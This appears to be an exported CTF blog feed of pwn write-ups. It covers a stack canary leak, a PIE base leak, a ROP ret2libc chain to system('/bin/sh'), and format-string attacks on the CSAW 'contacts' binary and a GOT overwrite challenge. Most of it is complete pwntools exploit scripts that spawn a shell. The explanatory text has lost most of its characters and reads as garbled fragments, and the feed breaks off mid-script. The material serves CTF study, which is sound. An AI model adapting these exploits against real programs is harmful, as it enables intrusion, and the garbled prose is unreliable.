&lt;+0&gt;:     endbr64 </span><br><span class="line">0x000055555555524d &lt;+4&gt;:     push   rbp</span><br><span class="line">0x000055555555524e &lt;+5&gt;:     mov    rbp,rsp</span><br><span class="line">0x0000555555555251 &lt;+8&gt;:     sub    rsp,0x70</span><br><span class="line">0x0000555555555255 &lt;+12&gt;:    mov    ecx,esi</span><br><span class="line">0x0000555555555257 &lt;+14&gt;:    mov    eax,edx</span><br><span class="line">0x0000555555555259 &lt;+16&gt;:    mov    edx,edi    ;646rdi rsi rdx rcx r8 r9</span><br><span class="line">0x000055555555525b &lt;+18&gt;:    mov    BYTE PTR [rbp-0x64],dl    f;,</span><br><span class="line">0x000055555555525e &lt;+21&gt;:    mov    edx,ecx</span><br><span class="line">0x0000555555555260 &lt;+23&gt;:    mov    BYTE PTR [rbp-0x68],dl    l</span><br><span class="line">0x0000555555555263 &lt;+26&gt;:    mov    BYTE PTR [rbp-0x6c],al   a       </span><br><span class="line">0x0000555555555266 &lt;+29&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line">0x000055555555526f &lt;+38&gt;:    mov    QWORD PTR [rbp-0x8],rax            </span><br><span class="line">0x0000555555555273 &lt;+42&gt;:    xor    eax,eax</span><br><span class="line">0x0000555555555275 &lt;+44&gt;:    mov    QWORD PTR [rbp-0x4a],0x0    ;</span><br><span class="line">0x000055555555527d &lt;+52&gt;:    mov    WORD PTR [rbp-0x42],0x0</span><br><span class="line">0x0000555555555283 &lt;+58&gt;:    movzx  eax,BYTE PTR [rbp-0x64];</span><br><span class="line">0x0000555555555287 &lt;+62&gt;:    mov    BYTE PTR [rbp-0x4a],al    f</span><br><span class="line">0x000055555555528a &lt;+65&gt;:    movzx  eax,BYTE PTR [rbp-0x68]    </span><br><span class="line">0x000055555555528e &lt;+69&gt;:    mov    BYTE PTR [rbp-0x49],al    l</span><br><span class="line">0x0000555555555291 &lt;+72&gt;:    movzx  eax,BYTE PTR [rbp-0x6c]  a;</span><br><span class="line">0x0000555555555295 &lt;+76&gt;:    mov    BYTE PTR [rbp-0x48],al</span><br><span class="line">0x0000555555555298 &lt;+79&gt;:    mov    BYTE PTR [rbp-0x47],0x67        </span><br><span class="line">0x000055555555529c &lt;+83&gt;:    mov    BYTE PTR [rbp-0x46],0x2e</span><br><span class="line">0x00005555555552a0 &lt;+87&gt;:    mov    BYTE PTR [rbp-0x45],0x74</span><br><span class="line">0x00005555555552a4 &lt;+91&gt;:    mov    BYTE PTR [rbp-0x44],0x78</span><br><span class="line">0x00005555555552a8 &lt;+95&gt;:    mov    BYTE PTR [rbp-0x43],0x74</span><br><span class="line">0x00005555555552ac &lt;+99&gt;:    lea    rax,[rbp-0x4a]</span><br><span class="line">0x00005555555552b0 &lt;+103&gt;:   lea    rsi,[rip+0xd51]        # 0x555555556008</span><br><span class="line">0x00005555555552b7 &lt;+110&gt;:   mov    rdi,rax</span><br><span class="line">0x00005555555552ba &lt;+113&gt;:   call   0x555555555140 &lt;fopen@plt&gt;</span><br><span class="line">0x00005555555552bf &lt;+118&gt;:   mov    QWORD PTR [rbp-0x58],rax</span><br><span class="line">0x00005555555552c3 &lt;+122&gt;:   cmp    QWORD PTR [rbp-0x58],0x0</span><br><span class="line">0x00005555555552c8 &lt;+127&gt;:   jne    0x5555555552e0 &lt;win+151&gt;</span><br><span class="line">0x00005555555552ca &lt;+129&gt;:   lea    rdi,[rip+0xd39]        # 0x55555555600a</span><br><span class="line">0x00005555555552d1 &lt;+136&gt;:   call   0x5555555550d0 &lt;puts@plt&gt;</span><br><span class="line">0x00005555555552d6 &lt;+141&gt;:   mov    edi,0x1</span><br><span class="line">0x00005555555552db &lt;+146&gt;:   call   0x555555555150 &lt;exit@plt&gt;</span><br><span class="line">0x00005555555552e0 &lt;+151&gt;:   mov    QWORD PTR [rbp-0x40],0x0</span><br><span class="line">0x00005555555552e8 &lt;+159&gt;:   mov    QWORD PTR [rbp-0x38],0x0</span><br><span class="line">0x00005555555552f0 &lt;+167&gt;:   mov    QWORD PTR [rbp-0x30],0x0</span><br><span class="line">0x00005555555552f8 &lt;+175&gt;:   mov    QWORD PTR [rbp-0x28],0x0</span><br><span class="line">0x0000555555555300 &lt;+183&gt;:   mov    QWORD PTR [rbp-0x20],0x0</span><br><span class="line">0x0000555555555308 &lt;+191&gt;:   mov    QWORD PTR [rbp-0x18],0x0</span><br><span class="line">0x0000555555555310 &lt;+199&gt;:   mov    rdx,QWORD PTR [rbp-0x58]</span><br><span class="line">0x0000555555555314 &lt;+203&gt;:   lea    rax,[rbp-0x40]</span><br><span class="line">0x0000555555555318 &lt;+207&gt;:   mov    esi,0x20</span><br><span class="line">0x000055555555531d &lt;+212&gt;:   mov    rdi,rax</span><br><span class="line">0x0000555555555320 &lt;+215&gt;:   call   0x555555555110 &lt;fgets@plt&gt;</span><br><span class="line">0x0000555555555325 &lt;+220&gt;:   lea    rax,[rbp-0x40]</span><br><span class="line">0x0000555555555329 &lt;+224&gt;:   mov    rdi,rax</span><br><span class="line">0x000055555555532c &lt;+227&gt;:   call   0x5555555550d0 &lt;puts@plt&gt;</span><br><span class="line">0x0000555555555331 &lt;+232&gt;:   nop</span><br><span class="line">0x0000555555555332 &lt;+233&gt;:   mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">0x0000555555555336 &lt;+237&gt;:   xor    rax,QWORD PTR fs:0x28</span><br><span class="line">0x000055555555533f &lt;+246&gt;:   je     0x555555555346 &lt;win+253&gt;</span><br><span class="line">0x0000555555555341 &lt;+248&gt;:   call   0x5555555550e0 &lt;__stack_chk_fail@plt&gt; ;canary</span><br><span class="line">0x0000555555555346 &lt;+253&gt;:   leave  </span><br><span class="line">0x0000555555555347 &lt;+254&gt;:   ret </span><br></pre></td></tr></table></figure><ol start="3"><li><p>leave ret  rbpretretfla0x6c,(0x0000555555555263 &lt;+26&gt;:    mov    BYTE PTR [rbp-0x6c],al )flag.txtpayload <em>payload&#x3D;ba*10+p64(canary)+p64(rbp_ad+0x6c)+p64(win_ad)+ba\x00\x00\x00+bl\x00\x00\x00+bf\x00\x00\x00</em></p><p><img src="/2023/02/16/23-2-16/image-20230217000537025.png" alt="image-20230217000537025"></p></li></ol><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b* $rebase(0x138E)&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;like ctf?&#x27;</span>,padding)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">rbp_ad=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp_ad))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Do you like ctf?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">ret_ad=<span class="number">0x1447</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-ret_ad</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line">win_ad=<span class="number">0x1273</span>+base</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+p64(rbp_ad+<span class="number">0x6c</span>)+p64(win_ad)+<span class="string">b&#x27;a\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;l\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;f\x00\x00\x00&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>expflag.txtflagwinrsp,&lt;+62&gt;&lt;+99&gt;rbp-0x4a</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000555555555283 &lt;+58&gt;:    movzx  eax,BYTE PTR [rbp-0x64]            ;</span><br><span class="line">0x0000555555555287 &lt;+62&gt;:    mov    BYTE PTR [rbp-0x4a],al    f</span><br><span class="line">0x000055555555528a &lt;+65&gt;:    movzx  eax,BYTE PTR [rbp-0x68]    </span><br><span class="line">0x000055555555528e &lt;+69&gt;:    mov    BYTE PTR [rbp-0x49],al    l</span><br><span class="line">0x0000555555555291 &lt;+72&gt;:    movzx  eax,BYTE PTR [rbp-0x6c]  a        ;</span><br><span class="line">0x0000555555555295 &lt;+76&gt;:    mov    BYTE PTR [rbp-0x48],al</span><br><span class="line">0x0000555555555298 &lt;+79&gt;:    mov    BYTE PTR [rbp-0x47],0x67        </span><br><span class="line">0x000055555555529c &lt;+83&gt;:    mov    BYTE PTR [rbp-0x46],0x2e</span><br><span class="line">0x00005555555552a0 &lt;+87&gt;:    mov    BYTE PTR [rbp-0x45],0x74</span><br><span class="line">0x00005555555552a4 &lt;+91&gt;:    mov    BYTE PTR [rbp-0x44],0x78</span><br><span class="line">0x00005555555552a8 &lt;+95&gt;:    mov    BYTE PTR [rbp-0x43],0x74</span><br><span class="line">0x00005555555552ac &lt;+99&gt;:    lea    rax,[rbp-0x4a]</span><br><span class="line">0x00005555555552b0 &lt;+103&gt;:   lea    rsi,[rip+0xd51]        # 0x555555556008</span><br><span class="line">0x00005555555552b7 &lt;+110&gt;:   mov    rdi,rax</span><br><span class="line">0x00005555555552ba &lt;+113&gt;:   call   0x555555555140 &lt;fopen@plt&gt;</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">win_ad=<span class="number">0x1273</span>+base</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+p64(rbp_ad+<span class="number">0x6c</span>)+p64(win_ad)+<span class="string">b&#x27;a\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;l\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;f\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">win_ad=<span class="number">0x012AC</span>+base </span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+p64(rbp_ad+<span class="number">0x4a</span>)+p64(win_ad)+<span class="string">b&#x27;flag.txt\x00&#x27;</span> <span class="comment">#flag.txt</span></span><br></pre></td></tr></table></figure><h2 id="tmshell"><a href="#tmshell" class="headerlink" title="tmshell"></a>tmshell</h2><p>shell</p><p>canary rbp pieputsputsputs64pop rdigadgetputs</p><p><img src="/2023/02/16/23-2-16/image-20230217002642059.png" alt="image-20230217002642059"></p><p>payload&#x3D;ba*10+p64(canary)+bdeadbeef+p64(poprdi)+p64(puts_got)+p64(puts_plt)+p64(getFeedback)</p><p>canaryrop</p><p>libcrop</p><p>payload&#x3D;ba*10+p64(canary)+bdeadbeef+p64(poprdi)+p64(bin_sh)+p64(ret)+p64(system_ad)</p><p>retsystemretubuntu1864system</p><blockquote><p>64systemmovaps16,6481608</p><p>0168ubuntu1864systemsystem0</p></blockquote><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b* $rebase(0x138E)&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;like ctf?&#x27;</span>,padding)</span><br><span class="line"><span class="comment"># print(io.recv())</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">rbp_ad=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp_ad))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Do you like ctf?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">ret_ad=<span class="number">0x1447</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-ret_ad</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="comment"># print(&quot;base&quot;+hex(base))</span></span><br><span class="line">poprdi=<span class="number">0x014d3</span>+base</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]+base</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]+base</span><br><span class="line">getFeedback=base+elf.symbols[<span class="string">&#x27;getFeedback&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_got))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_plt))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(getFeedback))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+<span class="string">b&#x27;deadbeef&#x27;</span>+p64(poprdi)+p64(puts_got)+p64(puts_plt)+p64(getFeedback)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">puts_ad=u64(io.recv()[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_ad&quot;</span>+<span class="built_in">hex</span>(puts_ad))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base_libc=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"><span class="comment"># base_libc=puts_ad-0x067970</span></span><br><span class="line">system_ad=base_libc+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="comment"># system_ad=base_libc+0x03f650</span></span><br><span class="line">bin_sh=base_libc+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment"># bin_sh=base_libc+0x163ef7</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">ret=base+<span class="number">0x0101a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system&quot;</span>+<span class="built_in">hex</span>(system_ad))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bin&quot;</span>+<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ret&quot;</span>+<span class="built_in">hex</span>(ret))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+<span class="string">b&#x27;deadbeef&#x27;</span>+p64(poprdi)+p64(bin_sh)+p64(ret)+p64(system_ad)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Can you provide some extra feedback?\n&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>shellflag.txtflagexp.</p><h2 id="-"><a href="#-" class="headerlink" title=":"></a>:</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/02/12/pwn/"/>
      <url>/2023/02/12/pwn/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><strong>got%$hhnbytepayloadpwntoolsfmtstr_payload(,{:})payloadpayload\x00</strong></p><span id="more"></span><h2 id="-esp-rsp--rop"><a href="#-esp-rsp--rop" class="headerlink" title=" esp(rsp) rop"></a> esp(rsp) rop</h2><p><strong><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts">contacts</a></strong></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="/2023/02/12/pwn/image-20230212164452297.png" alt="image-20230212164452297"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="/2023/02/12/pwn/image-20230212164600939.png" alt="image-20230212164600939"></p><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><p>switchPrintInfoformatDescription(malloc)c</p><p><img src="/2023/02/12/pwn/image-20230212164835416.png" alt="image-20230212164835416"></p><p><img src="/2023/02/12/pwn/image-20230212170204473.png" alt="image-20230212170204473"></p><p>printfgotsystemformat&#x2F;bin&#x2F;shshellsystem_addr + fake + addr of &#x2F;bin&#x2F;sh system_addr + fake + addr of &#x2F;bin&#x2F;shdescriptionmainebpdescription</p><h3 id="gdbexp"><a href="#gdbexp" class="headerlink" title="gdbexp"></a>gdbexp</h3><p>pieb *0x8048C22</p><p><img src="/2023/02/12/pwn/image-20230212173223423.png" alt="image-20230212173223423"></p><p>1PrintInfoebp2description3__libc_start_call_mainfmtarg</p><ol><li>%31$paaaa __libc_start_call_mainLibcsearchASLR 12 linux4kdumplibcsystem&#x2F;bin&#x2F;sh__libc_start_call_mainlibc_start_main</li><li>b%6$p%11$pbbb+p32(system)+bfake+p32(bin_sh)descriptionebprop</li><li>b%+str(heap_addr-4).encode()+bc+b%6$nmainebpdescription<ul><li> ebp  ebp %nebpmain</li><li>heap_addr-4mainleave  ret leavemov esp,ebp pop ebpleave espebppop ebp ebp+4-4fake ebp</li></ul></li><li>mainshell</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./contacts&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createcontact</span>(<span class="params">name, phone, descrip_len, description</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Contact info: \n&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Name: &#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;You have 10 numbers\n&#x27;</span>)</span><br><span class="line">    io.sendline(phone)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Length of description: &#x27;</span>)</span><br><span class="line">    io.sendline(descrip_len)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;description:\n\t\t&#x27;</span>)</span><br><span class="line">    io.sendline(description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printcontact</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Contacts:&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x8048C1F&#x27;)</span></span><br><span class="line">payload = <span class="string">&#x27;%31$paaaa&#x27;</span></span><br><span class="line">createcontact(<span class="string">b&#x27;1111&#x27;</span>, <span class="string">b&#x27;1111&#x27;</span>, <span class="string">b&#x27;111&#x27;</span>, payload)</span><br><span class="line">printcontact()</span><br><span class="line">__libc_start_call_main=<span class="built_in">int</span>(ru(<span class="string">b&#x27;aaaa&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;get libc_start_main_ret addr: &#x27;</span> + <span class="built_in">hex</span>(__libc_start_call_main))</span><br><span class="line">__libc_start_main=__libc_start_call_main+<span class="number">0x3B</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">p(<span class="string">&#x27;bin_sh&#x27;</span>,bin_sh)</span><br><span class="line">payload=<span class="string">b&#x27;%6$p%11$pbbb&#x27;</span>+p32(system)+<span class="string">b&#x27;fake&#x27;</span>+p32(bin_sh)</span><br><span class="line">createcontact(<span class="string">b&#x27;222&#x27;</span>,<span class="string">b&#x27;222&#x27;</span>,<span class="string">b&#x27;222&#x27;</span>,payload)</span><br><span class="line">printcontact()</span><br><span class="line">ru(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">data=ru(<span class="string">b&#x27;bbb&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">data=data.split(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">ebp_addr = <span class="built_in">int</span>(data[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(data[<span class="number">2</span>], <span class="number">16</span>)+<span class="number">12</span></span><br><span class="line">p(<span class="string">&#x27;ebp&#x27;</span>,ebp_addr)</span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap_addr)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(heap_addr-<span class="number">4</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$n&#x27;</span></span><br><span class="line">createcontact(<span class="string">b&#x27;3333&#x27;</span>, <span class="string">b&#x27;123456789&#x27;</span>, <span class="string">b&#x27;300&#x27;</span>, payload)</span><br><span class="line">printcontact()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="-got"><a href="#-got" class="headerlink" title=" got"></a> got</h2><p><a href="https://pan.baidu.com/s/1lLW4_0WPbxhORpcDk5GLZw">https://pan.baidu.com/s/1lLW4_0WPbxhORpcDk5GLZw</a><br>qydx</p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p><img src="/2023/02/12/pwn/image-20230212181525295.png" alt="image-20230212181525295"></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p><img src="/2023/02/12/pwn/image-20230212181617961.png" alt="image-20230212181617961"></p><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><p><img src="/2023/02/12/pwn/image-20230212181703467.png" alt="image-20230212181703467"></p><p>buf.bss(.bss:C0(0))</p><p><img src="/2023/02/12/pwn/image-20230212181831825.png" alt="image-20230212181831825"></p><p>fmtstr_payloadprintfprintfprintf gotsystemshell.bss</p><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>%pprintf</p><p><img src="/2023/02/12/pwn/image-20230212184115485.png" alt="image-20230212184115485"></p><p>10xffffcfa80xffffcfb80xffffcfacpie0xffffcfacelf+piegotelf+pie%$hn()buf%$pbufprintf_got+payloadgotsystem</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><ol><li><p>%p%6$pbufebp</p></li><li><p>ebp+</p></li><li><p>b%+str((ebp+)&amp;0xffff).encode()+bc+b%6$hnebp</p></li><li><p>piemainpieprintf_got  %11$p</p></li><li><p>b%+str(printf_got&amp;0xffff).encode()+bc+b%10$hnprintf_got</p></li><li><p>%11$s\x00 printf_gotprintflibc dumpsystem</p></li><li><p>printf_gotsystem</p><p><img src="/2023/02/12/pwn/image-20230212185436302.png" alt="image-20230212185436302"></p></li><li><p>3%$hn21.2.3.5printf_got</p></li><li><p>payloadgot</p></li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./fmt_str_level_2_x86&#x27;</span></span><br><span class="line">elf = 